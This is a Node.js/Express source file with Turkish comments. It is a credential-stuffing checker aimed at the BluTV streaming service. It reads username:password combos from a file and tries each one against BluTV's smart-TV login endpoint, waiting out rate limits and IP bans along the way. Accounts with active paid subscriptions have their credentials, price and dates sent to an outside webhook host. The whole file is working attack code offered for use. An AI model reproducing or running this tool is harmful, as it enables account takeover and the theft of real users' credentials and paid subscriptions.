const express = require('express');
const fetch = require('node-fetch');
const fs = require('fs');
const moment = require('moment-timezone');
const puppeteer = require('puppeteer');
const app = express();

const webhookUrl = 'http://ferlinblutv.rf.gd/webhook.php'; // Webhook URL'si
let isScanning = false;
let lastScanTime = 0;
let banEndTime = 0;

async function sendHitToWebhook(username, password, price, startDate, endDate) {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    const url = `${webhookUrl}?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}&price=${encodeURIComponent(price)}&start=${encodeURIComponent(startDate)}&end=${encodeURIComponent(endDate)}`;

    try {
        await page.goto(url, { waitUntil: 'networkidle2' });
        console.log(`Hit başarıyla webhook'a gönderildi: ${username}`);
    } catch (error) {
        console.error(`Webhook'a gönderme sırasında hata oluştu: ${error.message}`);
    } finally {
        await browser.close();
    }
}

async function processCombo(comboLines, res) {
    const turkeyTimeNow = moment().tz("Europe/Istanbul").format("YYYY-MM-DD");

    for (let line of comboLines) {
        if (line.includes(':')) {
            const [username, password] = line.trim().split(':');

            const url = 'https://smarttv.blutv.com.tr/actions/account/login';
            const headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-encoding': 'gzip, deflate',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'user-agent': 'Mozilla/5.0 (Windows; Windows NT 6.3; x64) AppleWebKit/535.42 (KHTML, like Gecko) Chrome/51.0.2492.278 Safari/601'
            };
            const data = new URLSearchParams({
                'username': username,
                'password': password,
                'platform': 'com.blu.smarttv'
            });

            // Her hesap arasında 5 saniye bekleme
            const currentTime = Date.now();
            if (currentTime - lastScanTime < 5000) {
                const waitTime = 5000 - (currentTime - lastScanTime);
                await new Promise(resolve => setTimeout(resolve, waitTime));
            }

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: data.toString()
                });

                if (response.status === 403) {
                    console.error('IP ban tespit edildi, 10 dakika bekleniyor...');
                    banEndTime = Date.now() + (10 * 60 * 1000); // 10 dakika ekle
                    await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000)); // 10 dakika bekle
                } else {
                    const jsonResponse = await response.json();

                    if (response.status === 200 && jsonResponse && jsonResponse.status === "ok") {
                        const userData = jsonResponse.user;
                        const startDateRaw = userData ? userData.StartDate : null;
                        const endDateRaw = userData ? userData.EndDate : null;
                        const price = userData ? userData.Price : 'Bilinmiyor';

                        if (!endDateRaw || endDateRaw === 'Bilinmiyor') {
                            console.log(`!Custom Hesap! - ${username}:${password}`);
                        } else {
                            const startDate = startDateRaw ? moment(startDateRaw).format('YYYY-MM-DD') : 'Bilinmiyor';
                            const endDate = endDateRaw ? moment(endDateRaw).format('YYYY-MM-DD') : 'Bilinmiyor';

                            if (moment(endDate).isBefore(turkeyTimeNow)) {
                                console.log(`!Custom Hesap! - ${username}:${password}`);
                            } else {
                                console.log(`!Hit Hesap! - ${username}:${password}`);
                                console.log(`Fiyat: ${price}`);
                                console.log(`Başlangıç Tarihi: ${startDate}`);
                                console.log(`Bitiş Tarihi: ${endDate}`);

                                await sendHitToWebhook(username, password, price, startDate, endDate);
                            }
                        }
                    } else {
                        console.log(`Yanlış Hesap: ${username}:${password}`);
                    }
                }

                // İlgili hesabı combo.txt'den sil
                comboLines = comboLines.filter(line => !line.includes(username));
                fs.writeFileSync('combo.txt', comboLines.join('\n'));

            } catch (error) {
                console.error(`Hata oluştu: ${error.message}`);
            }

            lastScanTime = Date.now(); // Son tarama zamanını güncelle
        }
    }

    isScanning = false;
    res.json({ status: "success", message: "Tarama tamamlandı." });
}

app.get('/', async (req, res) => {
    if (isScanning || Date.now() < banEndTime) {
        res.send("Tarama şu anda yapılıyor veya IP ban bekleme süresi devam ediyor.");
    } else {
        const comboFilePath = 'combo.txt';
        const comboLines = fs.readFileSync(comboFilePath, 'utf-8').split('\n').filter(Boolean);

        isScanning = true;
        res.send("Tarama başlatıldı, arka planda devam ediyor.");
        await processCombo(comboLines, res);
    }
});

app.use(express.static('public'));

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`Server ${PORT} portunda çalışıyor.`);
});
